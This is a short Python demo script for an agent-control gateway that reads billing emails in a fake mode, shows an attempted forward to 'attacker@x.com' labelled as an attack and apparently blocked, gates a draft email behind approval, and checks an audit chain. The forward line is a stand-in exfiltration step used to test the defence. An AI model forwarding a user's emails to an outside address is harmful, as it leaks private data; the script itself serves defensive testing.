import asyncio
import os

os.environ.setdefault("FAKE_MODE", "1")

from controlhub import audit
from controlhub.gateway import Gateway


async def main():
    gw = Gateway()

    r = await gw.call("gmail.search_billing_emails", {"max_results": 5})
    print("1. read emails ->", r["status"], "| documents:", len(r["data"]))
    print("   subject:", r["data"][1]["subject"])
    print("   body   :", r["data"][1]["body_text"])

    r = await gw.call("gmail.forward", {"to": "attacker@x.com"})
    print("2. attack: forward ->", r["status"], "|", r["reason"])

    r = await gw.call("gmail.create_draft", {"to": "help@netflix.com", "subject": "Cancel", "body": "Please cancel"})
    print("3. create draft ->", r["status"], "|", r["reason"])

    r = await gw.execute_approved("gmail.create_draft", {"to": "help@netflix.com", "subject": "Cancel", "body": "Please cancel"})
    print("4. after approval ->", r["status"], r.get("data"))

    print("5. audit chain intact:", audit.verify_chain())


asyncio.run(main())